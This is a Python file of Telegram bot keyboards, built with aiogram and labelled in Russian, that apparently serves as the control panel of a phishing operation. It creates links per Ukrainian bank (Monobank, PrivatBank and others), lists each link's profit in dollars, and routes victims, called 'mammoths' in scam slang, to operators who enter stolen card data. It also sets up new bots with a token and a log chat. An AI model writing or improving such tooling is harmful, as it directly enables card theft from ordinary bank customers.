from aiogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from database.db import Database


db = Database()


def menu() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.button(
        text="🌐 Создать ссылку",
        callback_data="create_link"
    )
    b.button(
        text="🦣 Мои ссылки",
        callback_data="links"
    )

    b.button(
        text="💬 Чаты",
        callback_data="chats"
    )
    b.button(
        text="👥 Рефералы",
        callback_data="referals"
    )
    b.adjust(2, 1, 2)
    return b.as_markup()


def back_to(
    callback: str
) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.button(
        text="⬅️ Назад",
        callback_data=callback
    )
    b.button(
        text="↩️ Назад в меню",
        callback_data="back_to_menu"
    )
    b.adjust(1)
    return b.as_markup()
    
def banks() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.button(
        text="🇺🇦 Монобанк",
        callback_data="bank:mono"
    )
    b.button(
        text="🇺🇦 Ощад банк",
        callback_data="bank:oshad"
    )
    b.button(
        text="🇺🇦 Райфайззен",
        callback_data="bank:raif"
    )
    b.button(
        text="🇺🇦 Пумб банк",
        callback_data="bank:pumb"
    )
    b.button(
        text="🇺🇦 Приват банк",
        callback_data="bank:privat"
    )
    b.button(
        text="↩️ Назад в меню",
        callback_data="back_to_menu"
    )
    b.adjust(2, 1, 2, 1)
    return b.as_markup()



def back() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.button(
        text="↩️ Назад в меню",
        callback_data="back_to_menu"
    )
    return b.as_markup()


async def links(
    user_id: int
) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    links = await db.get_user_links(user_id)
    offset = 9
    start_offset = 0
    end_offset = 9
    for link in links[start_offset:end_offset]:
        code = link['endpoint']
        profit = link['profit']
        b.button(
            text=f"🟢 {profit}$",
            callback_data=f"link:{code}"
        )

    if len(links) > 9:
        b.button(
            text="➡️ Вперед"
        )
    b.button(
        text="↩️ Назад в меню",
        callback_data="back_to_menu"
    )
    b.adjust(1)
    return b.as_markup()


async def links_pagination(
    user_id: int,
    page: int
) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    links = await db.get_user_links(user_id)
    offset = 9
    start_offset = page * offset
    end_offset = page * offset + offset
    for link in links[start_offset:end_offset]:
        code = link['endpoint']
        profit = link['profit']
        b.button(
            text=f"🟢 {profit}$",
            callback_data=f"link:{code}"
        )


    if len(links) < end_offset:
        b.button(
            text="➡️ Вперед",
            callback_data=f"links:{page + 1}"
        )

    if len(links) >= end_offset and page != 0:
        b.button(
            text="⬅️ Назад",
            callback_data=f"links:{page - 1}"
        )
    b.button(
        text="↩️ Назад в меню",
        callback_data="back_to_menu"
    )
    b.adjust(1)
    return b.as_markup()



class CreatorPanel:


    def panel(
        self
    ) -> InlineKeyboardMarkup:
        b = InlineKeyboardBuilder()
        b.button(
            text="🛠️ Создать бота",
            callback_data="create_bot"
        )
        b.button(
            text="🧰 Удалить бота",
            callback_data="delete_bot"
        )

        b.adjust(2)
        return b.as_markup()
        
    def create_bot(
        self,
        create: dict
    ) -> InlineKeyboardMarkup:

        
        def get_token(
            create: dict
        ) -> str:
            return {
                "text": "🔑 TOKEN ( Добавлен )" if 'token' in create else "🔑 TOKEN",
                "callback_data": f"create_bot/token:{create['token']}" if 'token' in create else 'create_bot/token:empty',
                'status': 'empty' if not 'token' in create else 'not empty'
            }



        def get_chat(
            create: dict
        ) -> str:
            return {
                "text":"💬 Чат-Лог ( Добавлен )" if 'chat' in create else "💬 Чат-Лог",
                "callback_data": f"create_bot/chat:{create['chat']}" if 'chat' in create else "create_bot/chat:empty",
                "status": "empty" if not 'chat' in create else 'not empty'
            }



        def get_creator(
            create: dict
        ) -> str:
            return {
                "text": "🟢 ТС" if "creator" in create else "🔴 TC",
                "callback_data": f"create_bot/creator:{create['creator']}" if 'creator' in create else "create_bot/creator:empty",
                "status": "empty" if not 'creator' in create else 'not_empty'
            }


        
        b = InlineKeyboardBuilder()

        token, chat, creator = get_token(create), get_chat(create), get_creator(create)

        b.button(
            text=token['text'],
            callback_data=token['callback_data']
        )
        b.button(
            text=chat['text'],
            callback_data=chat['callback_data']
        )
        b.button(
            text=creator['text'],
            callback_data=creator['callback_data']
        )

        token_data = create['token'] if token['status'] != 'empty' else 'empty'
        chat_data = create['chat'] if chat['status'] != 'empty' else 'empty'
        creator_data = create['creator'] if creator['status'] != 'empty' else 'empty'
        b.button(
            text="🔴 Очистить данные",
            callback_data="create_bot/clear"
        )
        b.button(
            text="✅ Создать бота",
            callback_data=f"create_bot:{token_data}_{chat_data}_{creator_data}"
        )
        b.button(
            text="❌ Отменить создание бота",
            callback_data="back_to_menu"
        )

        b.adjust(1, 2, 1, 1, 1)
        return b.as_markup()


def edit_bot() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.button(
        text="📥 Добавить общий чат",
        callback_data="edit_bot:add_main_chat"
    )
    b.button(
        text="🦣 Добавить чат вбиверов",
        callback_data="edit_bot:add_vbeaver_chat"
    )
    b.button(
        text="↩️ Назад в меню",
        callback_data="back_to_menu"
    )
    b.adjust(1)
    return b.as_markup()


def vbeaver_menu(user_id: int) -> InlineKeyboardMarkup:

    b = InlineKeyboardBuilder()
    b.button(
        text="🟢 Начать работу",
        callback_data=f"start_work:{user_id}"
    )
    b.button(
        text="🔴 Остановить работу",
        callback_data=f"stop_work:{user_id}"
    )
    b.adjust(1)
    return b.as_markup()


def take_for_vbeav(
    code: str
):

    b = InlineKeyboardBuilder()
    b.button(
        text="🦣 Взять мамонта",
        callback_data=f"take_for_vbeav:{code}"
    )
    return b.as_markup()